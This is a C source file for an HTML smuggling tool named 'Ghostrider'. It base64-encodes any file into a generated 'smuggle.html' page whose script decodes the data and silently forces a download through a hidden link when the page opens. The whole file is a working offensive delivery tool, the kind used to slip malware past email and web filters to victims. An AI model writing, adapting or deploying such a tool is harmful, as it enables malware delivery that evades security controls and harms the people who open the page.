//Ghostrider Designed by Cuong Nguyen
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Base64 encoding function
void base64Encode(const unsigned char* input, size_t inputLength, char** output) {
    const char base64Chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

    size_t outputLength = (inputLength + 2) / 3 * 4;
    *output = (char*)malloc(outputLength + 1);
    if (*output == NULL) {
        perror("Memory allocation failed");
        exit(EXIT_FAILURE);
    }

    for (size_t i = 0, j = 0; i < inputLength;) {
        unsigned int octet_a = i < inputLength ? (unsigned char)input[i++] : 0;
        unsigned int octet_b = i < inputLength ? (unsigned char)input[i++] : 0;
        unsigned int octet_c = i < inputLength ? (unsigned char)input[i++] : 0;

        unsigned int triple = (octet_a << 0x10) + (octet_b << 0x08) + octet_c;

        (*output)[j++] = base64Chars[(triple >> 3 * 6) & 0x3F];
        (*output)[j++] = base64Chars[(triple >> 2 * 6) & 0x3F];
        (*output)[j++] = base64Chars[(triple >> 1 * 6) & 0x3F];
        (*output)[j++] = base64Chars[(triple >> 0 * 6) & 0x3F];
    }

    for (size_t i = 0; i < (3 - inputLength % 3) % 3; i++) {
        (*output)[outputLength - 1 - i] = '=';
    }

    (*output)[outputLength] = '\0';
}

int main(int argc, char* argv[]) {
    if (argc != 2) {

        printf("\t\t\t ###########################################################\n");
        printf("\t\t\t #         Ghostrider - Designed By Cuong Nguyen           #\n");
        printf("\t\t\t ###########################################################\n\n");

       printf("[!] Usage: %s <input_file>\n", argv[0]);
       return 1;

}
   
    
    const char* inputFileName = argv[1];
    const char* outputFileName = "smuggle.html";

    // Read the input file
    FILE* inputFile = fopen(inputFileName, "rb");
    if (!inputFile) {
        printf("[i] Error: Failed to open input file.\n");
        return 1;
    }

    fseek(inputFile, 0, SEEK_END);
    long inputFileSize = ftell(inputFile);
    fseek(inputFile, 0, SEEK_SET);

    unsigned char* inputData = (unsigned char*)malloc(inputFileSize);
    if (!inputData) {
        printf("[i] Error: Memory allocation failed.\n");
        fclose(inputFile);
        return 1;
    }

    fread(inputData, 1, inputFileSize, inputFile);
    fclose(inputFile);

    // Base64 encode the entire input file
    char* base64EncodedData;
    base64Encode(inputData, inputFileSize, &base64EncodedData);

    // Create the HTML file with the JavaScript blob
    FILE* htmlFile = fopen(outputFileName, "w");
    if (!htmlFile) {
        printf("[i] Error: Failed to create HTML file.\n");
        free(inputData);
        free(base64EncodedData);
        return 1;
    }

    // Insert base64-encoded data into JavaScript code
    fprintf(htmlFile, "<html>\n");
    fprintf(htmlFile, "<body>\n");
    fprintf(htmlFile, "<script>\n");
    fprintf(htmlFile, "    function base64ToArrayBuffer(base64) {\n");
    fprintf(htmlFile, "        var binary_string = window.atob('%s');\n", base64EncodedData);
    fprintf(htmlFile, "        var len = binary_string.length;\n");
    fprintf(htmlFile, "        var bytes = new Uint8Array(len);\n");
    fprintf(htmlFile, "        for (var i = 0; i < len; i++) {\n");
    fprintf(htmlFile, "            bytes[i] = binary_string.charCodeAt(i);\n");
    fprintf(htmlFile, "        }\n");
    fprintf(htmlFile, "        return bytes.buffer;\n");
    fprintf(htmlFile, "    }\n");
    fprintf(htmlFile, "    var file = '%s';\n", base64EncodedData); // Insert base64 data
    fprintf(htmlFile, "    var data = base64ToArrayBuffer(file);\n");
    fprintf(htmlFile, "    var blob = new Blob([data], { type: 'octet/stream' });\n");
    fprintf(htmlFile, "    var fileName = '%s';\n", inputFileName);
    fprintf(htmlFile, "    if (window.navigator.msSaveOrOpenBlob) {\n");
    fprintf(htmlFile, "        window.navigator.msSaveOrOpenBlob(blob, fileName);\n");
    fprintf(htmlFile, "    } else {\n");
    fprintf(htmlFile, "        var a = document.createElement('a');\n");
    fprintf(htmlFile, "        console.log(a);\n");
    fprintf(htmlFile, "        document.body.appendChild(a);\n");
    fprintf(htmlFile, "        a.style = 'display: none';\n");
    fprintf(htmlFile, "        var url = window.URL.createObjectURL(blob);\n");
    fprintf(htmlFile, "        a.href = url;\n");
    fprintf(htmlFile, "        a.download = fileName;\n");
    fprintf(htmlFile, "        a.click();\n");
    fprintf(htmlFile, "        window.URL.revokeObjectURL(url);\n");
    fprintf(htmlFile, "    }\n");
    fprintf(htmlFile, "</script>\n");
    fprintf(htmlFile, "</body>\n");
    fprintf(htmlFile, "</html>\n");

    fclose(htmlFile);



 
    printf("[!] HTML Smuggle created successfully\n");
    printf("[i] Press <Enter> to exit program");
    getchar();

    free(inputData);
    free(base64EncodedData);

    return 0;
}


